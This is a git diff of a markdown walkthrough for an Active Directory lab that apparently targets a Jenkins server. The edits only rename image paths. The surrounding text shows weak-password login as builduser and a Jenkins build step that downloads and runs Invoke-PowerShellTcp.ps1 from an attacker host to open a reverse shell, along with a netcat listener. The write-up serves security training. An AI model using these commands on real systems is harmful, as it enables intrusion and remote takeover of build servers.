@@ -323,7 +323,7 @@ Go via browser on Jenkins site (172.16.3.11:8080) to Dashboard:
 
 This Jenkins vs has password policy without a restrictive rule, we can obtain username about three accounts going to [http://172.16.3.11:8080/asynchPeople/](http://172.16.3.11:8080/asynchPeople/)&#x20;
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 manager
@@ -333,11 +333,11 @@ jenkinsadmin
 
 so we can brute force accounts using Hydra, but first to proceed i've try to login at [http://172.16.3.11:8080/login](http://172.16.3.11:8080/login?from=%2Fuser%2Fjenkinsadmin%2F) using as a psw the same username and generic passwords login with builduser:builduser credentials
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Modify an existing project, clicking to existing project0
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Configure -> Add build step (write the following command) -> `powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339`
 
@@ -345,7 +345,7 @@ so we can brute force accounts using Hydra, but first to proceed i've try to log
 powershell.exe iex (iwr http://172.16.100.67/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.67 -Port 1339
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 and save it. Meanwhile run netcat on our attacker win machine going in listening mode on port 1339:
 
@@ -355,19 +355,19 @@ C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
 
 Now our student user appartains to administrators group and we can disabilitate firewall, do it!
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 After that, run a web server using HFS.exe present into Tool folder and move Invoke-PowerShellTCP.ps1 to Virtual File System copying the URL into program clipboard:
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 Click on Build Now
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 Go again to our shell and we'll see the connection back:
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```powershell
 ls env:
@@ -471,7 +471,7 @@ Find-PSRemotingLocalAdminAccess -Verbose
 
 Based on the task 3, we can login as builduser account using builduser:builduser credentials&#x20;
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Flag 8 \[dcorp-ci] - Domain user used for running Jenkins service on dcorp-ci 🚩
 
